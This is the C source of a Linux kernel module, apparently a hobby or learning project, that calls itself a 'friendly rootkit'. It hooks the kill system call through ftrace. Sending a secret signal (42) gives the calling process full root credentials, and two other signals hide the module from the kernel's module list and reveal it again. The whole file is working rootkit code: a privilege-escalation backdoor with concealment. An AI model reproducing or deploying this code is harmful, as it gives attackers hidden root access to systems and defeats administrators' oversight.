#include <linux/module.h>
#include <linux/printk.h>
#include <linux/ftrace.h>
#include <linux/cred.h>
#include <linux/ptrace.h>
#include <linux/kprobes.h>

    
typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
kallsyms_lookup_name_t get_kallsyms_lookup_name(void);
int hook_function(const char *hooked_function, struct ftrace_ops *operations);
void guardrail_unset_function(void);
void guardrail_set_function(void);
void give_root(void);
void hide_rootkit(void);
void unhide_rootkit(void);

void ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *fops, struct ftrace_regs *regs);
static asmlinkage long kill_hook(const struct ftrace_regs *regs);
static asmlinkage long (*original_kill)(const struct pt_regs *regs);

static struct ftrace_ops ops = {
    .func = ftrace_thunk,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY,
};

static struct list_head *current_module_object = NULL;

void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *fops, struct ftrace_regs *regs) {
    if(fops->private != NULL) {
        regs->regs.ip = (unsigned long) fops->private;
    }
}

void give_root(void) {
    struct cred *creds_struct = prepare_creds(); 
    /* Set the UID to root */
    creds_struct->uid.val = 0;
    creds_struct->euid.val = 0;

    /* Set the GID to root */
    creds_struct->gid.val = 0;
    creds_struct->egid.val = 0;

    /* Set the SUID and SGID to root */
    creds_struct->suid.val = 0;
    creds_struct->sgid.val = 0;
    creds_struct->fsuid.val = 0;
    creds_struct->fsgid.val = 0;

    commit_creds(creds_struct);
}

void hide_rootkit(void) {
    current_module_object = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide_rootkit(void) {
    list_add(&THIS_MODULE->list, current_module_object);
}

long kill_hook(const struct ftrace_regs *regs) {
    printk(KERN_INFO "The signal sent was: %d\n", (int)regs->regs.si);

    if (regs->regs.si == 42) {
        printk("[+] Secret signal was activated!\n");
        printk("[+] Giving root privileges!\n");
        give_root();
    }

    if (regs->regs.si == 36) {
        printk("[+] Going stealthy ^-^ ...\n");
        hide_rootkit();
    }
    
    if (regs->regs.si == 37) {
        if (current_module_object != NULL) {
            printk("[+] Leaving stealth mode T_T ...\n");
            unhide_rootkit();
            current_module_object = NULL;
        }
    }

    // Make sure to not createa an infinite loop
    guardrail_unset_function();
    // Call the original kill function
    int result = original_kill(&regs->regs);
    guardrail_set_function();

    return result;
}

void guardrail_unset_function(void) {
    ops.private = NULL;
}

void guardrail_set_function(void) {
    ops.private = kill_hook;
}

kallsyms_lookup_name_t get_kallsyms_lookup_name(void) {
    struct kprobe kb = {
        .symbol_name = "kallsyms_lookup_name",
    };
    register_kprobe(&kb);
    kallsyms_lookup_name_t kallsyms_lookup_name_func = (kallsyms_lookup_name_t)kb.addr;
    unregister_kprobe(&kb);
    return kallsyms_lookup_name_func;
}

int hook_function(const char *hooked_function, struct ftrace_ops *operations) {
    int status;
    kallsyms_lookup_name_t kallsyms_lookup_name = get_kallsyms_lookup_name();
    unsigned long hooked_function_address = kallsyms_lookup_name(hooked_function);

    if (hooked_function_address == 0) {
        printk("[-] Error: Could not hook function: %s\n", hooked_function);
        return -1;
    }

    *(uint64_t *)&original_kill = hooked_function_address;
   
    status = ftrace_set_filter_ip(operations, hooked_function_address, 0, 0);

    if (status) {
        printk("[-] Error: could not set filtering for hook on RIP: %d\n", status);
        return -1;
    }

    status = register_ftrace_function(operations);

    if (status) {
        printk("[-] Error: could register the ftrace function: %d\n", status);
        return -1;
    }

    guardrail_set_function();
    return 0;
}

int init_module(void) {
    int status;

    printk(KERN_INFO "Hooking into sys_kill system call!\n");
    if ((status = hook_function("__x64_sys_kill", &ops)) != 0) {
        return status;
    }

    printk("[+] Installed the friendly rootkit :^)\n");
    return 0;
}

void cleanup_module(void) {
    int status = unregister_ftrace_function(&ops);
    if (status) {
        printk(KERN_ERR "Could not unregister ftrace properly!\n");
        return;
    }
    status = ftrace_set_filter_ip(&ops, (unsigned long)original_kill, 1, 0);
    if (status) {
        printk(KERN_ERR "Could not remove the filter for the function hook!\n");
        return;
    }
    printk("[+] Goodbye from the fiendly rootkit :(\n");
}

MODULE_LICENSE("GPL");
